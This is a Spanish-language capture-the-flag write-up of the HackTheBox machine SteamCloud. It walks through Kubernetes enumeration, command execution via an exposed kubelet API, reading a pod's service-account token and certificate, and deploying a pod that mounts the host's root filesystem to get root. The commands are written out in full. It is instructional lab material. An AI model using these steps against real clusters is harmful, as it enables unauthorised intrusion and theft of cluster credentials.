---
title: SteamCoud | Linux
published: 2025-03-13
image: "./logo.png"
tags: [Easy, Linux, Kubernetes, YAML POD RCE, eWPTXv2, OSWE]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- Kubernetes API Enumeration (kubectl)
- Kubelet API Enumeration (kubeletctl)
- Command Execution through kubeletctl on the containers
- Cluster Authentication (ca.crt/token files) with kubectl
- Creating YAML file for POD creation
- Executing commands on the new POD
- Reverse Shell through YAML file while deploying the POD

### Preparación

- eWPTXv2
- OSWE

***

## Reconocimiento

Empezaremos sacando los puertos abiertos de la máquina con el comando **scan**.

```sh
# Uso: scan <IP>
scan () {
	sudo nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn "$1" -oG "nmap/AllPorts"
}
```

Podemos ver los puertos:

```
# Nmap 7.95 scan initiated Tue Mar 11 23:56:10 2025 as: /usr/lib/nmap/nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn -oG nmap/AllPorts 10.10.11.133
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.133 ()   Status: Up
Host: 10.10.11.133 ()   Ports: 22/open/tcp//ssh///, 2379/open/tcp//etcd-client///, 2380/open/tcp//etcd-server///, 8443/open/tcp//https-alt///, 10249/open/tcp/////, 10250/open/tcp/////, 10256/open/tcp/////    Ignored State: closed (65528)
# Nmap done at Tue Mar 11 23:56:22 2025 -- 1 IP address (1 host up) scanned in 12.14 seconds
```

Con la función **extractPorts** de el maestro s4vitar que nos permitirá copiar los puertos al clpiboard.

```sh
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

Con **nmap** haremos un escaneo más exaustivo a los servicios y versiones que corren en cada puerto.

```bash
sudo nmap -sCV -p22,2379,2380,8443,10249,10250,10256 -oN nmap/Scan 10.10.11.13
```

```txt wrap=false
# Nmap 7.95 scan initiated Tue Mar 11 23:56:50 2025 as: /usr/lib/nmap/nmap -sCV -p22,2379,2380,8443,10249,10250,10256 -oN nmap/Scan 10.10.11.133
Nmap scan report for 10.10.11.133
Host is up (0.042s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-03-11T18:28:05
|_Not valid after:  2026-03-11T18:28:05
|_ssl-date: TLS randomness does not represent time
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2025-03-11T18:28:05
|_Not valid after:  2026-03-11T18:28:06
8443/tcp  open  ssl/http         Golang net/http server
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-03-10T18:28:03
|_Not valid after:  2028-03-10T18:28:03
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 4a22f86e-0922-48f9-ba92-6ed77af8e2f0
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e
|     X-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b
|     Date: Tue, 11 Mar 2025 22:57:03 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 3dfed714-08b4-41c5-96d9-417ffdf6d503
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e
|     X-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b
|     Date: Tue, 11 Mar 2025 22:57:03 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User \"system:anonymous\" cannot get path \"/\"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 36c41be9-a1e6-431a-83ea-0d69230fa792
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e
|     X-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b
|     Date: Tue, 11 Mar 2025 22:57:03 GMT
|     Content-Length: 189
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User \"system:anonymous\" cannot options path \"/\"","reason":"Forbidden","details":{},"code":403}
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud@1741717687
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2025-03-11T17:28:07
|_Not valid after:  2026-03-11T17:28:07
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=3/11%Time=67D0BFBF%P=x86_64-pc-linux-gnu%r(GetRequest,22F,"HTTP/1\.0 403 Forbidden\r\nAudit-Id: 3dfed714-08b4-41c5-96d9-417ffdf6d503\r\nCache-Control: no-cache, private\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e\r\nX-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b\r\nDate: Tue, 11 Mar 2025 22:57:03 GMT\r\nContent-Length: 185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTPOptions,233,"HTTP/1\.0 403 Forbidden\r\nAudit-Id: 36c41be9-a1e6-431a-83ea-0d69230fa792\r\nCache-Control: no-cache, private\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e\r\nX-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b\r\nDate: Tue, 11 Mar 2025 22:57:03 GMT\r\nContent-Length: 189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"system:anonymous\\\" cannot options path \\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhFourRequest,24A,"HTTP/1\.0 403 Forbidden\r\nAudit-Id: 4a22f86e-0922-48f9-ba92-6ed77af8e2f0\r\nCache-Control: no-cache, private\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e\r\nX-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b\r\nDate: Tue, 11 Mar 2025 22:57:03 GMT\r\nContent-Length: 212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/nice ports,/Trinity.txt.bak\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 11 23:57:29 2025 -- 1 IP address (1 host up) scanned in 38.87 seconds
```

### Kubernetes 

Podemos ver por varios sitios que usa **Kubernetes** (_k8s_), un software de código abierto que sirve para implementar y administrar contenedores a gran escala. Pero si nos metemos por el puerto 8443 no podremos ver gran cosa solo un error.

Vamos a instalar las herramientas necesarias con el siguiente comando:


```
sudo wget https://github.com/cyberark/kubeletctl/releases/download/v1.13/kubeletctl_linux_amd64 && sudo chmod a+x ./kubeletctl_linux_amd64 && sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```


Ahora podremos listar información de los procesos que están corriendo en kubernete.

```
kubeletctl pods -s 10.10.11.133
```

```
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-proxy-xftvs                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ coredns-78fcd69978-lc4mh           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

Al ver que hay un pod por defecto en el sistema que es **nginx**, podemos intentar ejecutar comandos con el siguiente comando:

```
kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FMVh6Lwey8QChlnwo0AcE%2F1.png?alt=media&#x26;token=b15cdbda-5e13-4999-a45c-c45aafafa97f" alt=""><figcaption></figcaption></figure>

## Explotación

Sabiendo esto podemos poner como payload `/bin/shell` para ejecutar una shell interactiva.

```
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F8GUPe6vlLjaBoOAUogZR%2F2.png?alt=media&#x26;token=20efa5fa-125a-4973-b789-1c38825593a4" alt=""><figcaption></figcaption></figure>

Ya tendríamos la user flag.

### Escalada de privilegios

Ya que se sabe que se puede obtener información del sistema por medio de los comandos anteriores, se procede a buscar información importante en el sistema. Actualmente hay una página llamada HackTricks, esta nos permite obtener información sobre formas de hackeo. En este caso como estamos tocando temas de Kubernetes, se procede a realizar la busqueda sobre este tema y se observar que se encuentra la siguiente información.

[Kubernetes Tokens](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#kubernetes-tokens), esto nos indica que si se tiene comprometido el POD y se puede ejecutar comandos, se puede agregar un token ademas de traer la información del sistema.

Las rutas donde se pueden encontrar este token son:

* /run/secrets/kubernetes.io/serviceaccount
* /var/run/secrets/kubernetes.io/serviceaccount
* /secrets/kubernetes.io/serviceaccount

Se procede a probar una por una y vemos el siguiente resultado.

```sh
kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
ca.crt  namespace  token
```

**¿Qué significa cada archivo?**

```
ca.crt: Certificado por parte de kubernetes para comprobar las comunicaciones.
namespace: Nombre actual de los espacios.
token: Contiene el token del servicio actual.
```

Nos guardamos el token en una variable para tenerlo más a mano.


```sh
export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
```


Y ahora con este comando podremos ver las acciones que podemos hacer.


```sh
kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fm6WSjqwn9m7cw9yLNRMT%2F4.png?alt=media&#x26;token=54fc5d83-e0ca-4cbb-963c-57f21ed129be" alt=""><figcaption></figcaption></figure>

El que más permisos tiene es el de **pods**. Vamos a ver el archivo **.yml** de pod nginx, para poder crear uno propio por nosotros malicioso.

```yaml
❯ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"mountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}
  creationTimestamp: "2025-03-11T18:29:02Z"
  name: nginx
  namespace: default
  resourceVersion: "512"
  uid: be93e746-687e-4ad5-a18c-63e9a9ba5a94
spec:
  containers:
  - image: nginx:1.14.2
    imagePullPolicy: Never
    name: nginx
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /root
      name: flag
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-t2h5f
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: steamcloud
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - hostPath:
      path: /opt/flag
      type: ""
    name: flag
  - name: kube-api-access-t2h5f
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2025-03-11T18:29:02Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2025-03-11T18:29:03Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2025-03-11T18:29:03Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2025-03-11T18:29:02Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: docker://417d1c5915de5032f20e85a07afc02f9aa1858cc025eb498320fb2f2329b7fd1
    image: nginx:1.14.2
    imageID: docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
    lastState: {}
    name: nginx
    ready: true
    restartCount: 0
    started: true
    state:
      running:
        startedAt: "2025-03-11T18:29:03Z"
  hostIP: 10.10.11.133
  phase: Running
  podIP: 172.17.0.3
  podIPs:
  - ip: 172.17.0.3
  qosClass: BestEffort
  startTime: "2025-03-11T18:29:02Z"
```

La estrucrura de mi `zelpro.yml`  ser verá así.

```yaml
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: zelpro.yml
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ apiVersion: v1
   2   │ kind: Pod
   3   │ metadata:
   4   │   name: zelpro-pod
   5   │   namespace: default
   6   │ spec:
   7   │   containers:
   8   │   - name: zelpro-pod
   9   │     image: nginx:1.14.2
  10   │     volumeMounts:
  11   │     - mountPath: /mnt
  12   │       name: zelpro-privesc
  13   │   volumes:
  14   │   - name: zelpro-privesc
  15   │     hostPath:
  16   │       path: /
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Ahora ejecutaremos:


```
kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f zelpro.yml
```


<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FXFp9NTixr9hL0tExtVo3%2F5.png?alt=media&#x26;token=de9f51a0-0a2f-4e77-a7f3-5d57105ff062" alt=""><figcaption></figcaption></figure>

Volveremos a escanear los pods en busca del nuestro.

```
❯ kubeletctl -s 10.10.11.133 scan rce
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ coredns-78fcd69978-lc4mh           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ zelpro-pod                         │ default     │ zelpro-pod              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ kube-proxy-xftvs                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 9 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

Con el comando que ejecutamos anteriormente hacia el pod nginx para obtener una shell, lo modificaremos para que apunte a nuestro pod:

```
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p zelpro-pod -c zelpro-pod
```

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F53u2a8UHeiQdbGyn8gpO%2F6.png?alt=media&#x26;token=6580eca2-9e60-4d1e-a867-1c69b3823157" alt=""><figcaption></figcaption></figure>

Y ya tendríamos la root flag.

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/446)

---